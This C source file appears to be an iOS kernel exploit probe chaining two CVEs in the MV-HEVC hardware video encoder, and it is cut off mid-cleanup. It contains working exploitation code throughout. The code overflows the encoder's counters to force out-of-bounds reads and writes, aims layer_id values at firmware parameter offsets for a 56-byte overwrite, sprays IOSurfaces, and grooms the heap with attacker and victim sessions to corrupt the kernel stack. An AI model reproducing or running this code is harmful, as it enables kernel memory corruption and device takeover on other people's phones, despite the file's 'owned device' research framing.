/*
 * ave_full_chain.c — CVE-2026-114025 + CVE-2026-112465 Full Chain Probe
 *
 * Educational research on owned device (iPhone Duo, A20 Pro, iOS 27.1).
 *
 * This probe runs the COMPLETE exploitation sequence:
 * 1. Verify MV-HEVC support
 * 2. Measure NAL sizes and cumsum growth rate
 * 3. Test counter overflow survivability
 * 4. Test OOB READ (CVE-2026-112465) for kernel heap info leak
 * 5. Test firmware parameter corruption (+0x5ED4 -> 56-byte header overwrite)
 * 6. Test cross-buffer OOB with IOSurface spray
 *
 * Key thresholds:
 *   TABLE 1 (buffer+0x3770):
 *   Entry 256 (~86 encodes): First OOB write
 *   Entry 588 (~196 enc): Firmware param array start (+0x5C34)
 *   Entry 592 (~197 enc): +0x5C70 target pointer CORRUPTED → CRASH
 *   Entry 593 (~198 enc): +0x5C88 source pointer CORRUPTED
 *   *** Entries 592+ unreachable without crash ***
 *
 *   TABLE 2 (buffer+0x7DF4) — PRIMARY EXPLOITATION PATH:
 *   Entry 256 (~86 encodes): First OOB write
 *   Entry 466 (~155 enc): Past buffer end → HEAP OVERFLOW into adjacent alloc
 *   Safe window: 155-197 encodes (heap overflow without table 1 crash)
 *
 * Build: xcrun -sdk iphoneos clang -arch arm64e -miphoneos-version-min=17.0
 *        -framework VideoToolbox -framework CoreVideo -framework CoreMedia
 *        -framework CoreFoundation -framework IOSurface -framework IOKit
 *        -o AVEFullChain ave_full_chain.c -Wno-deprecated-declarations
 *
 * Bundle ID: com.research.avefullchain
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <CoreFoundation/CoreFoundation.h>
#include <VideoToolbox/VideoToolbox.h>
#include <CoreVideo/CoreVideo.h>

typedef struct __IOSurface *IOSurfaceRef;
typedef uint32_t IOSurfaceID;
extern IOSurfaceRef IOSurfaceCreate(CFDictionaryRef properties);
extern IOSurfaceID IOSurfaceGetID(IOSurfaceRef surface);
extern CFTypeRef IOSurfaceCopyValue(IOSurfaceRef surface, CFStringRef key);
extern void IOSurfaceSetValue(IOSurfaceRef surface, CFStringRef key, CFTypeRef value);
extern void *IOSurfaceGetBaseAddress(IOSurfaceRef surface);
extern kern_return_t IOSurfaceLock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);
extern kern_return_t IOSurfaceUnlock(IOSurfaceRef surface, uint32_t options, uint32_t *seed);

static FILE *g_log = NULL;
static volatile int g_encode_done = 0;
static volatile OSStatus g_cb_status = -999;
static volatile int g_cb_count = 0;
static volatile size_t g_last_pset_count = 0;
static volatile size_t g_last_pset_total_bytes = 0;

static void rlog(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    if (g_log) { vfprintf(g_log, fmt, ap); fflush(g_log); }
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    fflush(stdout);
    va_end(ap);
}

static void encode_cb(void *ctx, void *src, OSStatus status,
                      VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
    g_cb_status = status;
    g_cb_count++;
    g_encode_done = 1;

    if (buf && status == 0) {
        CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(buf);
        if (fmt) {
            size_t pset_count = 0;
            CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                fmt, 0, NULL, NULL, &pset_count, NULL);
            g_last_pset_count = pset_count;

            size_t total = 0;
            for (size_t i = 0; i < pset_count && i < 1000; i++) {
                size_t sz = 0;
                CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(
                    fmt, i, NULL, &sz, NULL, NULL);
                total += sz;
            }
            g_last_pset_total_bytes = total;
        }
    }
}

static CVPixelBufferRef create_pb(int w, int h) {
    CVPixelBufferRef pb = NULL;
    CFMutableDictionaryRef attrs = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryRef iosurf = CFDictionaryCreate(NULL, NULL, NULL, 0,
        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(attrs, kCVPixelBufferIOSurfacePropertiesKey, iosurf);
    CVReturn ret = CVPixelBufferCreate(NULL, w, h, kCVPixelFormatType_32BGRA, attrs, &pb);
    CFRelease(iosurf); CFRelease(attrs);
    if (ret != kCVReturnSuccess) return NULL;
    CVPixelBufferLockBaseAddress(pb, 0);
    void *base = CVPixelBufferGetBaseAddress(pb);
    if (base) memset(base, 0x42, w * h * 4);
    CVPixelBufferUnlockBaseAddress(pb, 0);
    return pb;
}

static VTCompressionSessionRef create_mvhevc_encoder(int w, int h, int layer_id) {
    VTCompressionSessionRef session = NULL;
    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);
    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"),
                         kCFBooleanTrue);

    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL,
        encode_cb, NULL, &session);
    CFRelease(enc_spec);
    if (st != noErr || !session) return NULL;

    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
    int kf = 1;
    CFNumberRef kfn = CFNumberCreate(NULL, kCFNumberIntType, &kf);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_MaxKeyFrameInterval, kfn);
    CFRelease(kfn);
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);

    int base = 0;
    CFNumberRef ids[2];
    ids[0] = CFNumberCreate(NULL, kCFNumberIntType, &base);
    ids[1] = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    CFArrayRef arr = CFArrayCreate(NULL, (const void **)ids, 2, &kCFTypeArrayCallBacks);
    VTSessionSetProperty(session, CFSTR("MVHEVCVideoLayerIDs"), arr);
    CFRelease(arr); CFRelease(ids[0]); CFRelease(ids[1]);

    CFNumberRef left = CFNumberCreate(NULL, kCFNumberIntType, &base);
    CFNumberRef right = CFNumberCreate(NULL, kCFNumberIntType, &layer_id);
    VTSessionSetProperty(session, CFSTR("MVHEVCLeftEyeID"), left);
    VTSessionSetProperty(session, CFSTR("MVHEVCRightEyeID"), right);
    CFRelease(left); CFRelease(right);

    st = VTCompressionSessionPrepareToEncodeFrames(session);
    if (st != noErr) {
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
        return NULL;
    }
    return session;
}

static int encode_one(VTCompressionSessionRef session, int frame_idx, int w, int h) {
    CVPixelBufferRef pb = create_pb(w, h);
    if (!pb) return -1;
    g_encode_done = 0;
    g_cb_status = -999;
    CMTime pts = CMTimeMake(frame_idx, 30);
    CMTime dur = CMTimeMake(1, 30);
    OSStatus st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
    if (st != noErr) { CVPixelBufferRelease(pb); return (int)st; }
    for (int i = 0; i < 100 && !g_encode_done; i++) usleep(10000);
    CVPixelBufferRelease(pb);
    return (int)g_cb_status;
}

/* Phase 1: Verify MV-HEVC */
static int phase1_verify(void) {
    rlog("\n========== PHASE 1: MV-HEVC Support ==========\n");
    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
    if (!s) {
        rlog("FAILED: MV-HEVC not supported on this device\n");
        rlog("MV-HEVC requires iPhone 15 Pro or later.\n");
        return -1;
    }
    int st = encode_one(s, 0, 128, 128);
    rlog("First encode: status=%d, pset_count=%zu\n", st, g_last_pset_count);
    VTCompressionSessionInvalidate(s); CFRelease(s);
    if (st != 0) {
        rlog("FAILED: Encode error %d\n", st);
        return -1;
    }
    rlog("PASS: MV-HEVC encoder works, %zu parameter sets per frame\n", g_last_pset_count);
    return 0;
}

/* Phase 2: Measure NAL sizes and cumsum growth */
static int phase2_measure(void) {
    rlog("\n========== PHASE 2: NAL Size Measurement ==========\n");
    rlog("Each MV-HEVC encode produces ~3 NAL entries (VPS+SPS+PPS)\n");
    rlog("Entry format: [NAL_type(4), layer_id(4), cumsum(4), data>>3(4)]\n");
    rlog("OOB starts when counter > 256 entries (~86 encodes)\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
    if (!s) return -1;

    for (int i = 0; i < 10; i++) {
        int st = encode_one(s, i, 128, 128);
        rlog("[%d] status=%d, psets=%zu, total_bytes=%zu\n",
             i, st, g_last_pset_count, g_last_pset_total_bytes);
        if (st != 0) break;
    }
    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);
    VTCompressionSessionInvalidate(s); CFRelease(s);

    rlog("\nExpected: ~3 entries/encode, cumsum grows ~0.25/entry at 128x128\n");
    rlog("Cumsum limit: 0x801 (2049) — small frames stay well under\n");
    return 0;
}

/* Phase 3: Counter overflow */
static int phase3_overflow(int max_encodes) {
    rlog("\n========== PHASE 3: Counter Overflow (%d encodes) ==========\n", max_encodes);
    rlog("OOB entry thresholds (table 1):\n");
    rlog("  256 (~86 enc): First write past VPS sub-object boundary\n");
    rlog("  588 (~196 enc): Firmware param array +0x5C34\n");
    rlog("  592 (~197 enc): +0x5C70 target pointer — CRASH BOUNDARY\n");
    rlog("OOB entry thresholds (table 2 — PRIMARY PATH):\n");
    rlog("  466 (~155 enc): Past buffer end → HEAP OVERFLOW\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
    if (!s) return -1;

    int first_error = -1;
    int errors = 0;
    for (int i = 0; i < max_encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            if (first_error < 0) first_error = i;
            errors++;
            rlog("[%d] ERROR: %d (total errors: %d)\n", i, st, errors);
            if (errors >= 10) {
                rlog("Too many errors, stopping\n");
                break;
            }
        }
        if ((i+1) % 25 == 0 || i == max_encodes-1) {
            int est_entries = (i+1) * 3;
            rlog("[%d/%d] psets=%zu, bytes=%zu, errors=%d, ~%d entries (OOB: %s)\n",
                 i+1, max_encodes, g_last_pset_count, g_last_pset_total_bytes, errors,
                 est_entries, est_entries > 256 ? "YES" : "no");
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);
    VTCompressionSessionInvalidate(s); CFRelease(s);

    if (first_error >= 0)
        rlog("\nFIRST ERROR at encode %d (~%d entries)\n", first_error, first_error * 3);
    else
        rlog("\nALL %d ENCODES SUCCEEDED — OOB corruption occurred SILENTLY\n", max_encodes);

    return errors;
}

/* Phase 4: OOB Read test (CVE-2026-112465) */
static int phase4_oob_read(int encodes) {
    rlog("\n========== PHASE 4: OOB Read (CVE-2026-112465) ==========\n");
    rlog("After counter overflow, READ path at 0x18a9610 iterates past boundary\n");
    rlog("CMVideoFormatDescriptionGetHEVCParameterSetAtIndex may return heap data\n");
    rlog("Encoding %d frames, tracking parameter set count/size changes\n\n", encodes);

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
    if (!s) return -1;

    size_t baseline_count = 0, baseline_bytes = 0;
    size_t max_count = 0, max_bytes = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (i == 0) {
            baseline_count = g_last_pset_count;
            baseline_bytes = g_last_pset_total_bytes;
            rlog("Baseline: psets=%zu, bytes=%zu\n", baseline_count, baseline_bytes);
        }
        if (g_last_pset_count > max_count) max_count = g_last_pset_count;
        if (g_last_pset_total_bytes > max_bytes) max_bytes = g_last_pset_total_bytes;
        if (st != 0) {
            rlog("[%d] Error: %d\n", i, st);
            break;
        }
        if ((i+1) % 50 == 0 || i == encodes-1)
            rlog("[%d] psets=%zu (max=%zu), bytes=%zu (max=%zu)\n",
                 i+1, g_last_pset_count, max_count, g_last_pset_total_bytes, max_bytes);
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nFinal: psets=%zu (baseline=%zu, max=%zu)\n",
         g_last_pset_count, baseline_count, max_count);
    rlog("       bytes=%zu (baseline=%zu, max=%zu)\n",
         g_last_pset_total_bytes, baseline_bytes, max_bytes);

    if (max_count > baseline_count) {
        rlog("*** OOB READ DETECTED: pset count grew from %zu to %zu ***\n",
             baseline_count, max_count);
        rlog("*** Extra entries contain KERNEL HEAP DATA ***\n");
    } else if (max_bytes > baseline_bytes * 2) {
        rlog("*** POSSIBLE OOB READ: total bytes grew significantly ***\n");
    } else {
        rlog("No obvious OOB read detected in parameter set metadata\n");
        rlog("Note: read path may use separate counter or clamp differently\n");
    }

    VTCompressionSessionInvalidate(s); CFRelease(s);
    return 0;
}

/* Phase 5: Firmware parameter corruption with controlled layer_id */
static int phase5_firmware(int encodes, int layer_id) {
    rlog("\n========== PHASE 5: Firmware Param Corruption ==========\n");
    rlog("Target: %d encodes with layer_id=%d (0x%x)\n", encodes, layer_id, layer_id);
    rlog("layer_id is written at byte position 4 of each 16-byte entry\n");
    rlog("All key targets at byte 4 = layer_id = FULLY CONTROLLED:\n");
    rlog("  +0x5D14 (entry 602): guard array — layer_id misroutes params\n");
    rlog("  +0x5ED4 (entry 630): 56-byte SIMD overwrite source\n");
    rlog("  +0x5F94 (entry 642): nonzero forces BLRAA indirect call\n");
    rlog("  +0x6414 (entry 714): W24 config override\n\n");

    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, layer_id);
    if (!s) return -1;

    int errors = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            errors++;
            rlog("[%d] Error: %d\n", i, st);
            if (errors >= 5) break;
        }
        if ((i+1) % 25 == 0 || i == encodes-1) {
            int est_entries = (i+1) * 3;
            const char *target = "pre-OOB";
            if (est_entries >= 714) target = "+0x6414 W24 REACHED";
            else if (est_entries >= 642) target = "+0x5F94 BLRAA REACHED";
            else if (est_entries >= 630) target = "+0x5ED4 SIMD REACHED";
            else if (est_entries >= 602) target = "+0x5D14 guard REACHED";
            else if (est_entries >= 256) target = "OOB active";
            rlog("[%d/%d] status=%d, ~%d entries, %s\n",
                 i+1, encodes, (int)g_cb_status, est_entries, target);
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nPost-corruption test encode...\n");
    int st = encode_one(s, encodes, 128, 128);
    rlog("Post-corruption: status=%d\n", st);

    VTCompressionSessionInvalidate(s); CFRelease(s);

    if (errors == 0)
        rlog("ALL %d ENCODES SUCCEEDED — firmware params silently corrupted\n", encodes);
    return errors;
}

/* Phase 6: IOSurface spray + encode for cross-buffer corruption detection */
#define SPRAY_COUNT 64

static IOSurfaceRef g_surfaces[SPRAY_COUNT];

static IOSurfaceRef create_spray_surface(int idx) {
    int alloc = 36864;
    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    int w = 96, h = 96, bpr = 384;
    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
    CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
    CFNumberRef nalloc = CFNumberCreate(NULL, kCFNumberIntType, &alloc);
    int fmt = 0x42475241;
    CFNumberRef nfmt = CFNumberCreate(NULL, kCFNumberIntType, &fmt);
    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
    CFDictionarySetValue(props, CFSTR("IOSurfaceAllocSize"), nalloc);
    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), nfmt);
    IOSurfaceRef surf = IOSurfaceCreate(props);
    CFRelease(nw); CFRelease(nh); CFRelease(nbpr); CFRelease(nalloc);
    CFRelease(nfmt); CFRelease(props);
    if (surf) {
        uint32_t tag = 0x53505259;
        CFNumberRef nsen = CFNumberCreate(NULL, kCFNumberIntType, &tag);
        IOSurfaceSetValue(surf, CFSTR("SprayTag"), nsen);
        CFRelease(nsen);
        IOSurfaceLock(surf, 0, NULL);
        void *base = IOSurfaceGetBaseAddress(surf);
        if (base) {
            memset(base, 0xAA, alloc);
            uint32_t *p32 = (uint32_t *)base;
            p32[0] = tag;
            p32[1] = (uint32_t)idx;
            for (int m = 4096; m < alloc; m += 4096) {
                p32[m/4] = 0xBEAC0000 | (idx & 0xFFFF);
            }
        }
        IOSurfaceUnlock(surf, 0, NULL);
    }
    return surf;
}

static int phase6_spray(int encodes) {
    rlog("\n========== PHASE 6: IOSurface Spray + OOB ==========\n");
    rlog("Spray %d IOSurfaces (36864 bytes each = kalloc.49152)\n", SPRAY_COUNT);
    rlog("HEVC buffer is ~39696 bytes in kalloc.49152 (or kalloc_data)\n");
    rlog("If HEVC buffer lands adjacent, OOB past entry 1059 (~353 enc)\n");
    rlog("corrupts next allocation\n\n");

    rlog("Phase 6a: Pre-spray %d surfaces\n", SPRAY_COUNT/2);
    for (int i = 0; i < SPRAY_COUNT/2; i++)
        g_surfaces[i] = create_spray_surface(i);

    rlog("Phase 6b: Create encoder (allocates HEVC buffer)\n");
    VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 0x4141);
    if (!s) {
        rlog("FAILED: Could not create encoder\n");
        for (int i = 0; i < SPRAY_COUNT/2; i++)
            if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
        return -1;
    }

    rlog("Phase 6c: Post-spray %d more surfaces\n", SPRAY_COUNT/2);
    for (int i = SPRAY_COUNT/2; i < SPRAY_COUNT; i++)
        g_surfaces[i] = create_spray_surface(i);

    rlog("Phase 6d: Encode %d frames (need ~353 for cross-buffer)\n", encodes);
    int errors = 0;
    for (int i = 0; i < encodes; i++) {
        int st = encode_one(s, i, 128, 128);
        if (st != 0) {
            errors++;
            rlog("[%d] Error: %d\n", i, st);
            if (errors >= 5) break;
        }
        if ((i+1) % 50 == 0 || i == encodes-1) {
            int est_entries = (i+1) * 3;
            rlog("[%d/%d] ~%d entries, cross-buffer: %s\n",
                 i+1, encodes, est_entries,
                 est_entries > 1059 ? "REACHED" : "not yet");
        }
    }

    VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
    usleep(500000);

    rlog("\nPhase 6e: Check spray surfaces for corruption\n");
    int corrupted = 0;
    for (int i = 0; i < SPRAY_COUNT; i++) {
        if (!g_surfaces[i]) continue;
        IOSurfaceLock(g_surfaces[i], 1, NULL);
        void *base = IOSurfaceGetBaseAddress(g_surfaces[i]);
        if (base) {
            uint32_t *p32 = (uint32_t *)base;
            int changes = 0;
            for (int j = 2; j < 9216; j++) {
                if (p32[j] != 0xAAAAAAAA) {
                    if (!changes) {
                        rlog("  SURFACE[%d] CORRUPTED at +0x%x: 0x%08x (expected 0xAAAAAAAA)\n",
                             i, j*4, p32[j]);
                        for (int k = (j>2?j-2:0); k < j+8 && k < 9216; k++)
                            rlog("    [+0x%04x] 0x%08x%s\n", k*4, p32[k],
                                 p32[k] != 0xAAAAAAAA ? " *" : "");
                    }
                    changes++;
                }
            }
            if (changes) {
                corrupted++;
                rlog("  Surface[%d]: %d words changed\n", i, changes);
            }
        }
        IOSurfaceUnlock(g_surfaces[i], 1, NULL);
    }

    rlog("\nCorrupted surfaces: %d / %d\n", corrupted, SPRAY_COUNT);
    if (corrupted > 0)
        rlog("*** CROSS-BUFFER OOB INTO ADJACENT ALLOCATION CONFIRMED ***\n");

    VTCompressionSessionInvalidate(s); CFRelease(s);
    for (int i = 0; i < SPRAY_COUNT; i++)
        if (g_surfaces[i]) { CFRelease(g_surfaces[i]); g_surfaces[i] = NULL; }
    return corrupted;
}

int main(int argc, char *argv[]) {
    char logpath[512];
    snprintf(logpath, sizeof(logpath), "%s/Documents/ave_full_chain.txt",
             getenv("HOME") ? getenv("HOME") : "/tmp");
    g_log = fopen(logpath, "w");

    rlog("=== CVE-2026-114025 + CVE-2026-112465 Full Chain Probe ===\n");
    rlog("Target: iPhone Duo (A20 Pro, iOS 27.1)\n");
    rlog("Time: %s\n", __TIMESTAMP__);
    rlog("PID: %d\n\n", getpid());

    const char *mode = (argc > 1) ? argv[1] : "help";

    if (strcmp(mode, "quick") == 0) {
        rlog("QUICK: Phases 1-3 (verify + measure + 100 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(100);

    } else if (strcmp(mode, "standard") == 0) {
        rlog("STANDARD: Phases 1-4 (+ 250 encodes + OOB read)\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(250);
        phase4_oob_read(300);

    } else if (strcmp(mode, "full") == 0) {
        rlog("FULL: All 6 phases\n\n");
        if (phase1_verify() != 0) goto done;
        phase2_measure();
        phase3_overflow(100);
        phase4_oob_read(300);
        phase5_firmware(220, 0x4141);
        phase6_spray(400);

    } else if (strcmp(mode, "blraa") == 0) {
        rlog("BLRAA: 250 encodes with layer_id=1 to trigger forced BLRAA\n");
        rlog("WARNING: Entry 642 (+0x5F94) nonzero forces PAC-auth indirect call\n");
        rlog("This WILL cause a kernel panic if PAC check fails!\n\n");
        if (phase1_verify() != 0) goto done;
        phase5_firmware(250, 1);

    } else if (strcmp(mode, "read_only") == 0) {
        rlog("READ_ONLY: OOB read test only (400 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase4_oob_read(400);

    } else if (strcmp(mode, "spray") == 0) {
        rlog("SPRAY: IOSurface spray + cross-buffer test (400 encodes)\n\n");
        if (phase1_verify() != 0) goto done;
        phase6_spray(400);

    } else if (strcmp(mode, "firmware") == 0) {
        int lid = (argc > 2) ? atoi(argv[2]) : 0x4141;
        int enc = (argc > 3) ? atoi(argv[3]) : 220;
        rlog("FIRMWARE: %d encodes with layer_id=0x%x\n\n", enc, lid);
        if (phase1_verify() != 0) goto done;
        phase5_firmware(enc, lid);

    } else if (strcmp(mode, "simd_target") == 0) {
        rlog("SIMD_TARGET: Precisely target entries #630-633 (56-byte overwrite)\n");
        rlog("The LDP Q0,Q1 + LDR Q2 + LDR X8 at 0x1765bcc copies 56 bytes\n");
        rlog("from entries 630-633 to target object at encoder+0x5C70->offset 0x00-0x37\n");
        rlog("Plus ~32 bytes to target+0xFC and 4 bytes to target+0x118\n\n");
        rlog("This probe encodes EXACTLY 211 frames (633 entries = entry #632)\n");
        rlog("to overwrite the target object header with our controlled data.\n");
        rlog("layer_id values at entries 630-633 become bytes 4-7 of each 16-byte entry\n\n");
        rlog("Strategy: Use different layer_id values to identify which entry maps where\n\n");
        if (phase1_verify() != 0) goto done;
        rlog("--- Sub-test A: 211 encodes with layer_id=0x4141 (generic marker) ---\n");
        phase5_firmware(211, 0x4141);
        rlog("\n--- Sub-test B: 210 encodes (stop just before SIMD overwrite) ---\n");
        rlog("This is the SAFE baseline — entries reach 630 but not all 4 needed\n");
        phase5_firmware(210, 0x4242);
        rlog("\n--- Sub-test C: 215 encodes with layer_id=0xDEAD (past BLRAA trigger) ---\n");
        rlog("WARNING: Entry 642 (+0x5F94) will be nonzero with NAL_type (1-3)\n");
        rlog("If +0x5F94 triggers, BLRAA with PAC mismatch -> KERNEL PANIC likely\n");
        rlog("Comment out this test if 211 encodes already panics\n");
        phase5_firmware(215, 0xDEAD);

    } else if (strcmp(mode, "simd_safe") == 0) {
        int lid = (argc > 2) ? (int)strtol(argv[2], NULL, 0) : 0x4141;
        rlog("SIMD_SAFE: Exactly 210 encodes (stop BEFORE SIMD overwrite)\n");
        rlog("layer_id=0x%x, entries ~630 = at SIMD boundary but not complete\n", lid);
        rlog("This should be safe — the 56-byte copy needs entries 630-633\n\n");
        if (phase1_verify() != 0) goto done;
        phase5_firmware(210, lid);

    } else if (strcmp(mode, "cumsum_predict") == 0) {
        rlog("CUMSUM_PREDICT: Measure NAL sizes to predict cumsum at entry #601\n");
        rlog("+0x5C88 (SIMD target pointer) is at entry 601, byte offset 8 = cumsum\n");
        rlog("The cumsum value at entry 601 becomes the SIMD overwrite's target addr\n");
        rlog("If we can predict/control cumsum, we can redirect the 56-byte write\n\n");
        if (phase1_verify() != 0) goto done;
        rlog("Phase A: Detailed NAL measurement (20 encodes)\n\n");
        VTCompressionSessionRef s = create_mvhevc_encoder(128, 128, 1);
        if (!s) goto done;
        size_t prev_bytes = 0;
        size_t total_nal_bytes = 0;
        int total_entries = 0;
        for (int i = 0; i < 20; i++) {
            int st = encode_one(s, i, 128, 128);
            size_t delta = g_last_pset_total_bytes - (i > 0 ? prev_bytes : 0);
            prev_bytes = g_last_pset_total_bytes;
            rlog("[%d] status=%d psets=%zu total_bytes=%zu delta=%zu\n",
                 i, st, g_last_pset_count, g_last_pset_total_bytes, delta);
            if (st != 0) break;
            total_entries += (int)g_last_pset_count;
            total_nal_bytes += delta;
        }
        VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        usleep(500000);
        VTCompressionSessionInvalidate(s); CFRelease(s);
        rlog("\nTotal: %d entries from 20 encodes = %.1f entries/encode\n",
             total_entries, total_entries / 20.0);
        rlog("Total NAL bytes: %zu\n", total_nal_bytes);
        if (total_entries > 0) {
            double avg_nal = (double)total_nal_bytes / total_entries;
            double avg_cumsum_inc = avg_nal / 8.0;
            double cumsum_at_601 = avg_cumsum_inc * 601;
            rlog("Average NAL size: %.1f bytes\n", avg_nal);
            rlog("Average cumsum increment (data>>3): %.2f per entry\n", avg_cumsum_inc);
            rlog("PREDICTED cumsum at entry 601: %.0f (0x%x)\n",
                 cumsum_at_601, (uint32_t)cumsum_at_601);
            rlog("PREDICTED cumsum at entry 630: %.0f (0x%x)\n",
                 avg_cumsum_inc * 630, (uint32_t)(avg_cumsum_inc * 630));
            rlog("PREDICTED cumsum at entry 642: %.0f (0x%x)\n",
                 avg_cumsum_inc * 642, (uint32_t)(avg_cumsum_inc * 642));
            rlog("\nFor IOSurface spray targeting:\n");
            rlog("  kalloc.49152 addresses typically align to 0x1000 pages\n");
            rlog("  Spray IOSurfaces, note addresses, then predict which\n");
            rlog("  encode count places cumsum near a spray address\n");
        }

    } else if (strcmp(mode, "dual") == 0) {
        rlog("DUAL: Multi-session spray + cross-buffer OOB + victim trigger\n");
        rlog("This is the PRIMARY exploitation path:\n");
        rlog("1. Create 20 MV-HEVC sessions (spray HEVC buffers in kalloc_data.49152)\n");
        rlog("2. Free alternating sessions to create holes\n");
        rlog("3. Create attacker + victim sessions in holes\n");
        rlog("4. Attacker encodes 360 frames -> cross-buffer OOB into victim +0x8\n");
        rlog("5. Victim encodes 1 frame -> corrupted loop bound -> stack overflow\n\n");
        if (phase1_verify() != 0) goto done;

        rlog("\n--- Phase A: Create 20 spray sessions ---\n");
        #define DUAL_SPRAY 20
        VTCompressionSessionRef spray_sessions[DUAL_SPRAY];
        for (int i = 0; i < DUAL_SPRAY; i++) {
            spray_sessions[i] = create_mvhevc_encoder(128, 128, 1);
            if (!spray_sessions[i]) {
                rlog("Session %d creation failed\n", i);
            } else {
                int st = encode_one(spray_sessions[i], 0, 128, 128);
                rlog("Session %d: created, first encode status=%d\n", i, st);
            }
        }

        rlog("\n--- Phase B: Free alternating sessions ---\n");
        for (int i = 0; i < DUAL_SPRAY; i += 2) {
            if (spray_sessions[i]) {
                VTCompressionSessionInvalidate(spray_sessions[i]);
                CFRelease(spray_sessions[i]);
                spray_sessions[i] = NULL;
                rlog("Freed session %d\n", i);
            }
        }
        usleep(100000);

        rlog("\n--- Phase C: Create attacker (lid=0x4141) + victim (lid=1) ---\n");
        VTCompressionSessionRef attacker = create_mvhevc_encoder(128, 128, 0x4141);
        VTCompressionSessionRef victim = create_mvhevc_encoder(128, 128, 1);
        if (!attacker || !victim) {
            rlog("FAILED to create attacker/victim\n");
            goto dual_cleanup;
        }
        int ast = encode_one(attacker, 0, 128, 128);
        int vst = encode_one(victim, 0, 128, 128);
        rlog("Attacker first encode: %d, Victim first encode: %d\n", ast, vst);

        rlog("\n--- Phase D: Attacker encodes 360 frames ---\n");
        rlog("Target: entry 1059+ (~353 enc) for cross-buffer OOB\n");
        int atk_errors = 0;
        for (int i = 1; i < 360; i++) {
            int st = encode_one(attacker, i, 128, 128);
            if (st != 0) {
                atk_errors++;
                rlog("[ATK %d] Error: %d\n", i, st);
                if (atk_errors >= 5) break;
            }
            if ((i+1) % 50 == 0 || i == 359) {
                int est = (i+1) * 3;
                rlog("[ATK %d/%d] ~%d entries, cross-buffer: %s\n",
                     i+1, 360, est, est > 1059 ? "REACHED" : "not yet");
            }
        }

        rlog("\n--- Phase E: Victim encodes 1 frame (may trigger stack overflow) ---\n");
        rlog("If victim +0x8 was corrupted to ~700, the loop at 0x1915168\n");
        rlog("runs 700 iterations × 256-byte format = stack overflow\n");
        rlog("Saved registers x19-x28 corrupted on stack\n");
        rlog("WARNING: This may cause a kernel panic!\n\n");
        vst = encode_one(victim, 1, 128, 128);
        rlog("Victim second encode: status=%d\n", vst);
        rlog("If we get here, either:\n");
        rlog("  a) Cross-buffer did not reach victim (not adjacent)\n");
        rlog("  b) Victim +0x8 was not corrupted to exploitable value\n");
        rlog("  c) Stack overflow was caught by guard page\n");
        rlog("  d) PAC failure on return address caused graceful error\n");

        rlog("\n--- Phase F: Check victim parameter sets for OOB data ---\n");
        rlog("Victim pset_count=%zu, pset_bytes=%zu\n",
             g_last_pset_count, g_last_pset_total_bytes);

        dual_cleanup:
        if (attacker) { VTCompressionSessionInvalidate(attacker); CFRelease(attacker); }
        if (victim) { VTCompressionSessionInvalidate(victim); CFRelease(victim); }
        for (int i = 0; i < DUAL_SPRAY; i++)
            if (spray_sessions[i]) {
